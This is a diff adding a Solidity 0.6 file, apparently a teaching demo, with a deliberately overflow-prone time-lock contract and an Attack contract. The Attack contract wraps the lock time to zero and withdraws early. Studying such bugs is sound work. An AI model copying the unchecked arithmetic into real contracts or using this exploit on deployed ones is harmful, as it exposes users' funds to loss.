@@ -1,0 +1,51 @@
+//SPDX-License-Identifier: MIT
+pragma solidity ^0.6.7;
+
+contract TimeLock {
+    //一个时间锁合约
+    mapping(address => uint) public balances;
+    mapping(address => uint) public lockTime;
+    
+    function deposit() external payable {
+        //调用者存余额，锁一个星期
+        balances[msg.sender] += msg.value;
+        lockTime[msg.sender] = block.timestamp + 1 weeks;
+    }
+
+    function increaseLockTime(uint _time) public {
+        //增加锁定时间
+        lockTime[msg.sender] += _time;
+    }
+    
+    function withdraw() public {
+        //提款
+        require(balances[msg.sender] > 0, "funds");
+        require(block.timestamp > lockTime[msg.sender], "not lock");
+
+        uint amount = balances[msg.sender];
+        balances[msg.sender] = 0;
+
+        (bool sent,) = msg.sender.call{value: amount}("");
+        require(sent,"failed to sent");
+    }
+ }
+
+ contract Attack {
+     TimeLock public timelock;
+     //要攻击的时间锁合约地址
+     constructor(address _TimeLock) public {
+         timelock = TimeLock(_TimeLock);
+     }
+     fallback() external payable {}
+     //回退函数
+
+     function attack() public payable {
+         //x+y=2*256=0
+         //所以我们要传入一个负的timelock.lockTime(address(this))
+         timelock.deposit{value: msg.value}();
+
+         timelock.increaseLockTime( uint (-timelock.lockTime(address(this))));
+         timelock.withdraw();
+     }
+
+ }
